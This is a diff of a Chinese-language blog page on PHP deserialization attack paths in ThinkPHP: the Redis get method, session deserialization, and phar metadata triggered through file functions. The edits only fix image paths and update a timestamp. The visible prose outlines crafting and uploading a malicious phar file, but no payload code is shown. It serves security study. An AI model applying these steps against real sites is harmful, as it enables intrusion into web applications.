 <p>php自带的unserialize方法</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918151516506.png" alt="image-20240918151516506" /></p>
+<p><img src="../../../typora-user-images/image-20240918151516506.png" alt="image-20240918151516506" /></p>
 <h2 id="redis模块"><a class="markdownIt-Anchor" href="#redis模块"></a> Redis模块</h2>
 <p>既然自带了unserialize方法，那么我们去tp框架搜索一下该方法，有没有什么方法是封装了这个函数的呢？</p>
 <ul>
 <li>不难发现redis模块的get方法获取键值的时候是调用反序列化方法的</li>
 </ul>
 <p>值以think_serialize开始会进行反序列化</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918152247395.png" alt="image-20240918152247395" /></p>
+<p><img src="../../../typora-user-images/image-20240918152247395.png" alt="image-20240918152247395" /></p>
 <p><strong>当然高版本的get方法实现起来又不一样了，tp6是另一套写法，tp5这个实战比较多，就拿这个举例了</strong></p>
 <h2 id="session反序列化"><a class="markdownIt-Anchor" href="#session反序列化"></a> Session反序列化</h2>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
@@ -835,7 +835,7 @@ namespace&#123;
 <h2 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> Phar反序列化</h2>
 <p>phar反序列化是实战中的大头，先简单总结一下，phar文件的metadata部分存储的是反序列化数据，当使用phar协议处理文件时，会对这部分数据进行反序列化。（<strong>PHP8已经做了修复</strong>）</p>
 <p>主要影响的函数就是文件操作相关的。</p>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5C20191105195413-fc4b3ca0-ffc2-1.png" alt="20191105195413-fc4b3ca0-ffc2-1" /></p>
+<p><img src="../../../typora-user-images/20191105195413-fc4b3ca0-ffc2-1.png" alt="20191105195413-fc4b3ca0-ffc2-1" /></p>
 <p>实际上很好理解：</p>
 <ol>
 <li>生成恶意的phar文件。（后缀无要求）</li>
@@ -895,7 +895,7 @@ namespace&#123;
 <ol start="2">
 <li>伪协议触发（实战中需要自己尝试上传文件）</li>
 </ol>
-<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918161944044.png" alt="image-20240918161944044" /></p>
+<p><img src="../../../typora-user-images/image-20240918161944044.png" alt="image-20240918161944044" /></p>
 <p><strong>分析到这里也能看到，我们代码中必须是整个参数都可以控制，这样才能控制phar前缀</strong></p>
 <h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1>
 <p><a target="_blank" rel="noopener" href="https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/">https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/</a></p>
@@ -919,7 +919,7 @@ namespace&#123;
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2024-09-18 16:26:54
+              2024-09-19 10:08:30
             </span>
             
                   <span class="post-tags">
